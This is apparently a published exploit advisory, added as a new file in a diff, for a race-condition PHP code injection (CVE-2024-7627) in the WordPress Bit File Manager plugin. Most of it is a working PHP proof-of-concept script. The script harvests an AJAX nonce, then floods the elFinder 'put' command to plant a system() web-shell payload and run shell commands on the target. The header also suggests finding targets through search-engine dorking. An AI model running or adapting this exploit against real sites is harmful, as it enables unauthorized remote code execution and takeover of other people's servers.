@@ -1,0 +1,147 @@
+=============================================================================================================================================
+| # Title     : WordPress Bit File Manager 6.5.5 Race Condition php code injection                                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/plugins/file-manager/                                                                                 |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: exploiting Remote Command Execution Vulnerability via Race Condition in Vulnerable WordPress Plugins Using elFinder
+
+    (Related : https://packetstorm.news/files/id/189176/ Related CVE numbers: CVE-2024-7627 ) .
+	
+[+] save code as poc.php.
+
+[+] Set Target : line 112.
+
+[+] Usage : php poc.php 
+
+[+] PayLoad :
+
+<?php
+class Poc {
+    private $targetBaseUrl;
+    private $session;
+    private $raceConditionJobs;
+    private $ELFINDER_AJAX_ACTION = 'bit_fm_connector_front';
+    private $READ_DIRECTORY_FILES_ELFINDER_COMMAND = 'open';
+    private $EDIT_FILE_ELFINDER_COMMAND = 'put';
+    private $AJAX_ENDPOINT;
+    private $PHP_PAYLOAD = '<?php system("{cmd}");?>';
+    private $EDITED_TEMPORARY_FILE_URL;
+
+    public function __construct($targetBaseUrl, $raceConditionJobs = 50) {
+        $this->targetBaseUrl = $targetBaseUrl;
+        $this->session = curl_init();
+        $this->raceConditionJobs = $raceConditionJobs;
+        $this->AJAX_ENDPOINT = $this->targetBaseUrl . '/wp-admin/admin-ajax.php';
+        $this->EDITED_TEMPORARY_FILE_URL = $this->targetBaseUrl . '/wp-content/uploads/file-managertemp.php';
+    }
+
+    public function getAjaxNonce($fileManagerPostPath) {
+        echo '[*] Getting a valid AJAX nonce...' . PHP_EOL;
+        $fileManagerPostUrl = $this->targetBaseUrl . $fileManagerPostPath;
+        curl_setopt($this->session, CURLOPT_URL, $fileManagerPostUrl);
+        curl_setopt($this->session, CURLOPT_RETURNTRANSFER, 1);
+        $responseText = curl_exec($this->session);
+
+        preg_match('/var fm = (.*);/', $responseText, $matches);
+        if (empty($matches)) {
+            echo '[-] Unable to get a valid AJAX nonce' . PHP_EOL;
+            exit(0);
+        }
+
+        $parsedJsonObject = json_decode($matches[1], true);
+        $ajaxNonce = $parsedJsonObject['nonce'];
+        echo '[+] Found the valid AJAX nonce: ' . $ajaxNonce . PHP_EOL;
+        return $ajaxNonce;
+    }
+
+    public function getRandomFileHash($nonce) {
+        echo '[*] Getting a random file\'s hash via elFinder command "' . $this->READ_DIRECTORY_FILES_ELFINDER_COMMAND . '"...' . PHP_EOL;
+        $bodyData = [
+            'action' => $this->ELFINDER_AJAX_ACTION,
+            'nonce' => $nonce,
+            'cmd' => $this->READ_DIRECTORY_FILES_ELFINDER_COMMAND,
+            'init' => '1'
+        ];
+
+        $ch = curl_init($this->AJAX_ENDPOINT);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($bodyData));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $jsonResponse = json_decode(curl_exec($ch), true);
+        
+        if (isset($jsonResponse['error'])) {
+            echo '[-] Unable to get a random file\'s hash' . PHP_EOL;
+            exit(0);
+        }
+
+        $currentWorkingDirectoryFiles = $jsonResponse['files'];
+        foreach ($currentWorkingDirectoryFiles as $file) {
+            if (isset($file['hash']) && isset($file['name']) && $file['mime'] !== 'directory') {
+                $fileHash = $file['hash'];
+                $filename = $file['name'];
+                break;
+            }
+        }
+
+        echo '[+] Found file "' . $filename . '" with hash "' . $fileHash . '"!' . PHP_EOL;
+        return $fileHash;
+    }
+
+    public function executeEditFileRaceCondition($nonce, $fileHash, $commandToExecute) {
+        echo '[*] Editing file with hash "' . $fileHash . '" via elFinder command "' . $this->EDIT_FILE_ELFINDER_COMMAND . '" and getting the edited temporary PHP file at "' . $this->EDITED_TEMPORARY_FILE_URL . '"...' . PHP_EOL;
+
+        $bodyData = [
+            'action' => $this->ELFINDER_AJAX_ACTION,
+            'nonce' => $nonce,
+            'cmd' => $this->EDIT_FILE_ELFINDER_COMMAND,
+            'target' => $fileHash,
+            'content' => str_replace('{cmd}', $commandToExecute, $this->PHP_PAYLOAD)
+        ];
+
+        $results = [];
+        for ($i = 0; $i < $this->raceConditionJobs; $i++) {
+            $ch = curl_init($this->AJAX_ENDPOINT);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($bodyData));
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            $results[] = curl_exec($ch);
+        }
+
+        foreach ($results as $responseText) {
+            if (empty($responseText)) {
+                echo '[-] Failed to read the edited temporary PHP file in time' . PHP_EOL;
+                continue;
+            }
+
+            echo '[+] We won the race condition! Here\'s the PHP payload result:' . PHP_EOL;
+            echo $responseText . PHP_EOL;
+            break;
+        }
+    }
+
+    public function exploit($fileManagerPostPath, $commandToExecute) {
+        $ajaxNonce = $this->getAjaxNonce($fileManagerPostPath);
+        $fileHash = $this->getRandomFileHash($ajaxNonce);
+        $this->executeEditFileRaceCondition($ajaxNonce, $fileHash, $commandToExecute);
+    }
+}
+
+$targetBaseUrl = 'http://localhost'; // Change to the target URL
+$fileManagerPostPath = '/?p=6'; // Change to the correct path
+$commandToExecute = 'whoami; id; hostname'; // Command to execute
+
+$poc = new Poc($targetBaseUrl);
+$poc->exploit($fileManagerPostPath, $commandToExecute);
+?>
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
